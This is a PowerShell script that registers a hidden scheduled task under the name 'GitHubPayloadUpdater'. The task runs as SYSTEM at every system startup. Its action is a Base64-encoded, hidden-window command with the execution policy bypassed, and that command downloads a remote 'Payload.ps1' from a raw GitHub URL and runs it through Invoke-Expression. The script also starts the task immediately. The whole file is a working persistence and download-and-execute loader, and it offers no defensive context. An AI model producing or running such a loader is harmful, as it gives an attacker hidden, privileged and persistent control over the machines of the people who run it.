# ============================================
# TASK NAME (change this if you want)
# ============================================
$TaskName = "GitHubPayloadUpdater"

# ============================================
# YOUR GITHUB PAYLOAD URL (change this to your actual repo)
# ============================================
$PayloadUrl = "https://raw.githubusercontent.com/joault/powershell/main/Payload.ps1"

# ============================================
# INNER COMMAND (this is what the task runs)
# ============================================
$InnerCommand = @"
`$ProgressPreference = 'SilentlyContinue'
Invoke-Expression (Invoke-WebRequest '$PayloadUrl' -UseBasicParsing).Content
"@

# Encode the inner command as Base64
$InnerBytes = [System.Text.Encoding]::Unicode.GetBytes($InnerCommand)
$InnerBase64 = [Convert]::ToBase64String($InnerBytes)

# ============================================
# BUILD THE SCHEDULED TASK
# ============================================

# Action: runs PowerShell with the encoded command
$Action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand $InnerBase64"

# Principal: runs as SYSTEM, no user needed
$Principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

# Settings: keeps running even on battery
$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -Compatibility Win8 `
    -Hidden

# Trigger: runs at every system startup
$Trigger = New-ScheduledTaskTrigger -AtStartup

# ============================================
# REGISTER THE TASK
# ============================================

# Remove old version if it exists
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Create the task
Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Principal $Principal `
    -Settings $Settings `
    -Trigger $Trigger `
    -Force

# ============================================
# RUN IT IMMEDIATELY (FOR TESTING)
# ============================================
Start-ScheduledTask -TaskName $TaskName

Write-Host "Task '$TaskName' registered and started successfully." -ForegroundColor Green
